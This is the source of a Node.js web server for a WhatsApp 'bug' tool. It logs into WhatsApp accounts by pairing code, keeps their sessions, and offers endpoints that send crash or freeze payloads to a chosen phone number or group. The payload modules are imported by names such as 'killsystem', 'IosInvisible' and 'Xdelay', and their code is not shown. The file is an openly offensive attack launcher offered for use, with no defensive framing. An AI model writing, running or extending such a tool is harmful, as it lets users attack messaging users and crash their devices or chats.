/*
 * © 2026 SeXyxeon (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://youtube.com/@voidsec7718
 * Instagram : sabir._7718
 * Telegram  : https://t.me/SABIR7718
 * GitHub    : https://github.com/SABIR7718
 * WhatsApp  : +91 73650 85213
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */


const express = require('express');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    Browsers,
    delay,
    proto,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    generateForwardMessageContent,
    downloadContentFromMessage,
    downloadMediaMessage,
    getContentType,
    extractMessageContent,
    normalizeMessageContent,
    jidDecode,
    jidNormalizedUser,
    areJidsSameUser,
    isJidUser,
    isJidGroup,
    generateMessageIDV2,
    encode,
    decode,
    DEFAULT_CONNECTION_CONFIG,
    WA_DEFAULT_EPHEMERAL
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const chalk = require('chalk');
const {
    log
} = require('@sabir7718/log');
const NodeCache = require("node-cache");
const crypto = require('crypto');
const cors = require('cors');
let cachedBaileysVersion = null;

const sysLog = msg => log.info(msg);
const successLog = msg => log.success(msg);
const warnLog = msg => log.warn(msg);
const errLog = msg => log.error(msg);

const SY = express();
SY.use(cors());
SY.use(express.json());

// Clear Ok SY Moyna 🥰

SY.use((req, res, next) => {
    log('success', 'API', `Request received on ${req.method} ${req.url}`);
    next();
});

const publicPath = path.join(__dirname, "public");

SY.use(express.static(publicPath));

// SY Loves Here 🤗❤️‍🩹

const SYLoves = `./SY/S7/`

const gcFrzLogic = require(SYLoves + 'gcFrz');
const stickerLogic = require(SYLoves + 'StickerCrash');
const XgcLogic = require(SYLoves + 'Xgc');
const killsystemLogic = require(SYLoves + 'killsystem');
const IosLogic = require(SYLoves + 'IosInvisible');
const XdelayLogic = require(SYLoves + 'Xdelay');

const activeSessions = new Map();

async function getVersion() {
    if (!cachedBaileysVersion) {
        const {
            version
        } = await fetchLatestBaileysVersion();
        cachedBaileysVersion = version;
        log('success', 'BAILEYS', `version cached → ${version}`);
    }
    return cachedBaileysVersion;
}

function restoreLovingSY() {
    const sessionsDir = path.join(__dirname, 'Love');
    if (!fs.existsSync(sessionsDir)) {
        fs.mkdirSync(sessionsDir);
        return;
    }
    const folders = fs.readdirSync(sessionsDir);
    for (const folder of folders) {
        const sessionPath = path.join(sessionsDir, folder);
        if (fs.lstatSync(sessionPath).isDirectory()) {
            log('success', 'BAILEYS', `Restoring session for: ${folder.split('|').pop().slice(0,10)}`);
            StartLovingSY(folder);
        }
    }
}

async function StartLovingSY(deviceCode, phoneNumber, res = null) {
    const sessionPath = path.join(__dirname, 'Love', deviceCode);
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(sessionPath);
    const usePairingCode = !!phoneNumber;

    const msgRetryCache = new NodeCache();

    const sock = makeWASocket({
        version: await getVersion(),
        logger: pino({
            level: "silent"
        }),
        printQRInTerminal: !usePairingCode,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({
                level: "fatal"
            }))
        },
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: false,
        msgRetryCounterCache: msgRetryCache,
        defaultQueryTimeoutMs: 60000,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 10000
    });

    activeSessions.set(deviceCode, {
        sock,
        status: 'connecting'
    });
    sysLog(`Connecting: ${deviceCode.split('|').pop().slice(0,10)}`);

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const {
            connection,
            lastDisconnect
        } = update;

        if (connection === 'open') {
            const jid = sock.user.id;
            activeSessions.set(deviceCode, {
                sock,
                status: 'connected',
                number: jid
            });
            successLog(`connected: ${deviceCode.split('|').pop().slice(0,10)} : ${jid.split(':')[0]}`);
        } else if (connection === 'close') {
            const reason = lastDisconnect?.error?.output?.statusCode;

            warnLog(`Session closed: ${deviceCode.split('|').pop().slice(0,10)}, Reason: ${reason}`);

            activeSessions.delete(deviceCode);

            const isPaired = !!sock.authState.creds.me;

            if (reason === DisconnectReason.loggedOut) {

                sysLog(`Logged out: ${deviceCode.split('|').pop().slice(0,10)}`);

                if (fs.existsSync(sessionPath)) {
                    fs.rmSync(sessionPath, {
                        recursive: true,
                        force: true
                    });
                }

            } else if (!isPaired) {

                sysLog(`Pairing not completed: ${deviceCode.split('|').pop().slice(0,10)}`);

            } else {

                setTimeout(() => {
                    if (!activeSessions.has(deviceCode)) {
                        sysLog(`Reconnecting: ${deviceCode.split('|').pop().slice(0,10)}`);
                        StartLovingSY(deviceCode);
                    }
                }, 15000);

            }
        }

    });

    if (phoneNumber && !sock.authState.creds.me) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(phoneNumber);
                sysLog(`Pairing code generated: ${deviceCode.split('|').pop().slice(0,10)}`);
                if (res) res.json({
                    success: true,
                    deviceCode,
                    pairingCode: code
                });
            } catch (error) {
                errLog(`Pairing error: ${error.message}`);
                if (res) res.status(500).json({
                    success: false,
                    error: error.message
                });
            }
        }, 2000);
    } else if (res) {
        sysLog(`Session already exists: ${deviceCode.split('|').pop().slice(0,10)}`);
        res.json({
            success: true,
            message: 'Session exists',
            deviceCode
        });
    }

    if (!sock.authState.creds.me) {
        setTimeout(() => {
            if (!sock.authState.creds.me) {
                sysLog(`Pairing timeout → deleting session: ${deviceCode.split('|').pop().slice(0,10)}`);
                activeSessions.delete(deviceCode);

                if (fs.existsSync(sessionPath)) {
                    fs.rmSync(sessionPath, {
                        recursive: true,
                        force: true
                    });
                }
            }
        }, 60000);
    }
}

SY.get("/:page", (req, res, next) => {

    const page = req.params.page;
    const filePath = path.join(publicPath, page + ".html");

    if (fs.existsSync(filePath)) {
        return res.sendFile(filePath);
    }

    next();
});

SY.get("/", (req, res) => {
    res.sendFile(path.join(publicPath, "login.html"));
});

SY.post('/connect', (req, res) => {
    const {
        deviceCode,
        phoneNumber
    } = req.body;
    if (!deviceCode || !phoneNumber) return res.status(400).json({
        error: 'Missing parameters'
    });
    StartLovingSY(deviceCode, phoneNumber, res);
});

SY.get('/active-sessions', (req, res) => {
    const sessionsList = [];
    for (const [code, data] of activeSessions.entries()) {
        if (data.status === 'connected') {
            sessionsList.push({
                deviceCode: code,
                number: data.number
            });
        }
    }
    sysLog(`Active sessions fetched. Count: ${sessionsList.length}`);
    res.json({
        activeSessions: sessionsList
    });
});

SY.post('/session-status', (req, res) => {
    const {
        deviceCode
    } = req.body;
    const session = activeSessions.get(deviceCode);
    if (!session) {
        sysLog(`Status check: ${deviceCode.split('|').pop().slice(0,10)} (Disconnected)`);
        return res.json({
            deviceCode,
            status: 'disconnected'
        });
    }
    sysLog(`Status check: ${deviceCode.split('|').pop().slice(0,10)} | ${session.number ? session.number.split('@')[0] : 'N/A'} (${session.status})`);
    res.json({
        deviceCode,
        status: session.status
    });
});

SY.post('/disconnect', (req, res) => {
    const {
        deviceCode
    } = req.body;
    const session = activeSessions.get(deviceCode);
    const sessionPath = path.join(__dirname, 'sessions', deviceCode);

    sysLog(`Disconnect request: ${deviceCode.split('|').pop().slice(0,10)}`);

    if (session) {
        session.sock.logout();
        activeSessions.delete(deviceCode);
    }

    if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, {
            recursive: true,
            force: true
        });
    }

    res.json({
        success: true,
        message: 'Disconnected'
    });
});

SY.post('/info', async (req, res) => {
    const { deviceCode } = req.body;
    const session = activeSessions.get(deviceCode);

    if (!session || session.status !== 'connected') {
        log(`Info fetch failed: No session for ${deviceCode.split('|').pop().slice(0,10)}`, 'ERROR');
        return res.json({ error: 'no session connected' });
    }

    try {
        const sock = session.sock;
        const jid = sock.user.id.split(':')[0] + '@s.whatsapp.net'; 
        
        let profilePicUrl = null;
        try {
            profilePicUrl = await sock.profilePictureUrl(jid, 'image');
        } catch (picError) {
            log(`Profile pic fetch error for ${deviceCode.split('|').pop().slice(0,10)}: No picture found or privacy hidden`, 'WARN');
        }

        const name = sock.user.name || sock.user.verifiedName || 'Unknown Name';

        log(`Info successfully fetched for: ${deviceCode.split('|').pop().slice(0,10)}`);
        res.json({
            success: true,
            deviceCode: deviceCode,
            name: name,
            profilePicture: profilePicUrl
        });

    } catch (error) {
        log(`Info error: ${error.message}`, 'ERROR');
        res.status(500).json({ error: error.message });
    }
});

SY.post('/listgc', async (req, res) => {
    const { deviceCode } = req.body;
    const session = activeSessions.get(deviceCode);

    if (!session || session.status !== 'connected') {
        log(`Group list fetch failed: No session for ${deviceCode.split('|').pop().slice(0,10)}`, 'ERROR');
        return res.json({ error: 'no session connected' });
    }

    try {
        const sock = session.sock;
        const groups = await sock.groupFetchAllParticipating();
        const groupList = [];

        for (const jid in groups) {
            const group = groups[jid];
            let groupPic = null;

            try {
                groupPic = await sock.profilePictureUrl(jid, 'image').catch(() => null);
            } catch (err) {
            }

            groupList.push({
                name: group.subject,
                jid: jid,
                profilePicture: groupPic
            });
        }

        log(`Groups listed for ${deviceCode.split('|').pop().slice(0,10)}. Count: ${groupList.length}`);
        res.json({ success: true, groups: groupList });

    } catch (error) {
        log(`ListGC error: ${error.message}`, 'ERROR');
        res.status(500).json({ error: error.message });
    }
});

SY.post('/sy', async (req, res) => {
    const {
        deviceCode,
        targetNumber
    } = req.body;
    const session = activeSessions.get(deviceCode);

    if (!session || session.status !== 'connected') {
        errLog(`SY failed: No session for ${deviceCode.split('|').pop().slice(0,10)}`);
        return res.json({
            error: 'no session connected'
        });
    }

    const target = `${targetNumber}@s.whatsapp.net`;
    try {
        if (typeof IosLogic.IosInvisible === 'function') {
            (async () => {
                try {
                    sysLog(`SY Bug Sending Success: ${target}`);
                    await IosLogic.IosInvisible(session.sock, target);
                    sysLog(`SY Bug Sent Success: ${target}`);
                } catch (error) {
                    errLog(`SY background error: ${error.message}`);
                }
            })();
        }
        res.json({
            success: true,
            message: 'SUCCESS'
        });
    } catch (error) {
        errLog(`SY error: ${error.message}`);
        res.status(500).json({
            error: error.message
        });
    }
});

SY.post('/sy2', async (req, res) => {
    const {
        deviceCode,
        targetNumber
    } = req.body;
    const session = activeSessions.get(deviceCode);

    if (!session || session.status !== 'connected') {
        errLog(`SY2 failed: No session for ${deviceCode.split('|').pop().slice(0,10)}`);
        return res.json({
            error: 'no session connected'
        });
    }

    const target = `${targetNumber}@s.whatsapp.net`;
    try {
        if (typeof killsystemLogic.killsystem === 'function') {
        (async () => {
                try {
                    sysLog(`SY2 Bug Sending Success: ${target}`);
                    await killsystemLogic.killsystem(session.sock, target);
                    sysLog(`SY2 Bug Sent Success: ${target}`);
                } catch (error) {
                    errLog(`SY2 background error: ${error.message}`);
                }
            })();
        }
        res.json({
            success: true,
            message: 'SUCCESS'
        });
    } catch (error) {
        errLog(`SY2 error: ${error.message}`);
        res.status(500).json({
            error: error.message
        });
    }
});

SY.post('/sy3', async (req, res) => {
    const {
        deviceCode,
        targetNumber
    } = req.body;
    const session = activeSessions.get(deviceCode);

    if (!session || session.status !== 'connected') {
        errLog(`SY3 failed: No session for ${deviceCode.split('|').pop().slice(0,10)}`);
        return res.json({
            error: 'no session connected'
        });
    }

    const target = `${targetNumber}@s.whatsapp.net`;
    try {
        if (typeof XdelayLogic.Xdelay === 'function') {
        (async () => {
                try {
                    sysLog(`SY3 Bug Sending Success: ${target}`);
                    await XdelayLogic.Xdelay(session.sock, target);
                    sysLog(`SY3 Bug Sent Success: ${target}`);
                } catch (error) {
                    errLog(`SY3 background error: ${error.message}`);
                }
            })();
        }
        res.json({
            success: true,
            message: 'SUCCESS'
        });
    } catch (error) {
        errLog(`SY3 error: ${error.message}`);
        res.status(500).json({
            error: error.message
        });
    }
});

SY.post('/sygc', async (req, res) => {
    const {
        deviceCode,
        targetGC
    } = req.body;
    const session = activeSessions.get(deviceCode);

    if (!session || session.status !== 'connected') {
        errLog(`SYGC failed: No session for ${deviceCode.split('|').pop().slice(0,10)}`);
        return res.json({
            error: 'no session connected'
        });
    }

    const target = `${targetGC}`;
    try {
        if (typeof XgcLogic.Xgc === 'function') {
        (async () => {
                try {
                    sysLog(`SYGC Bug Sending Success: ${target}`);
                    await XgcLogic.Xgc(session.sock, target);
                    sysLog(`SYGC Bug Sent Success: ${target}`);
                } catch (error) {
                    errLog(`SYGC background error: ${error.message}`);
                }
            })();
        }
        sysLog(`SYGC success: GC Bug sent to ${target}`);
        res.json({
            success: true,
            message: 'SUCCESS'
        });
    } catch (error) {
        errLog(`SYGC error: ${error.message}`);
        res.status(500).json({
            error: error.message
        });
    }
});

process.on('uncaughtException', (err) => {
    errLog(`Uncaught Exception: ${err.message}`);
});

process.on('unhandledRejection', (reason) => {
    errLog(`Unhandled Rejection: ${reason}`);
});

SY.use((err, req, res, next) => {
    errLog(`Global Express Error: ${err.message}`);
    res.status(500).json({
        error: 'Internal Server Error'
    });
});

SY.listen(3000, () => {
    log('success', 'SERVER', `STARTED ON PORT 3000`);
});

/* IT WILL LOVE OK 🥰*/

restoreLovingSY();